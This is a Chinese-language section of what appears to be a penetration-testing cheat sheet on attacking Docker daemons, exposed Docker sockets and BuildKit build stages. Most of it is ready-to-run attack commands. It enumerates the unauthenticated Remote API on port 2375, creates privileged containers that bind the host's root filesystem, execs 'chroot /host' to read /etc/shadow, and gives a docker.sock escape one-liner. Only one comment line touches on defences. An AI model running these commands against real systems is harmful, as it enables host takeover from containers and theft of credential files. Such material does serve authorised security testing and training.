## 二、Docker Daemon 与 API 攻击面

### 2.1 Docker Remote API 未授权（2375/2376）

```bash
# 未授权探测
curl -s http://target:2375/version
curl -s http://target:2375/containers/json
curl -s http://target:2375/info | jq '.Containers, .Images, .DockerRootDir'

# 创建特权容器接管宿主机（经典 Payload）
curl -X POST http://target:2375/containers/create -H "Content-Type: application/json" -d '{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh"],
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host"],
    "NetworkMode": "host",
    "PidMode": "host"
  }
}'
# 获取容器 ID 后 start + exec
curl -X POST http://target:2375/containers/{id}/start
curl -X POST http://target:2375/containers/{id}/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"Cmd":["/bin/sh","-c","chroot /host /bin/sh -c \"id; cat /etc/shadow\""]}'

# 加密 TLS 但证书泄露/复用（2376）
openssl s_client -connect target:2376 2>/dev/null | openssl x509 -noout -subject -issuer
```

### 2.2 Docker Socket 暴露

```bash
# 容器内探测
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null

# 直接调用宿主机 Docker（无 docker CLI 时用 curl）
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/create -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host sh -c \"id > /tmp/pwned\""],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'

# 经典逃逸：sock → 特权容器 → chroot 宿主机
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host --net=host \
  -v /:/mnt alpine chroot /mnt
```

### 2.3 BuildKit / 构建阶段攻击面

```bash
# BuildKit 会话未授权（如 CI 暴露 buildkitd socket）
# docker buildx 默认复用 daemon 权限，CI 中 buildkit 容器常以特权运行 → 构建步骤即宿主机命令执行
# 测试：构建阶段 RUN 指令可写 /proc/sysrq-trigger、加载内核模块（配合逃逸 CVE）

# 挂载 docker.sock 进 buildkit/kaniko 场景 → 镜像构建即逃逸
# 防御参考：rootless buildkit、禁止 privileged、构建网络隔离（联动 ci-cd-attack-testing）
```

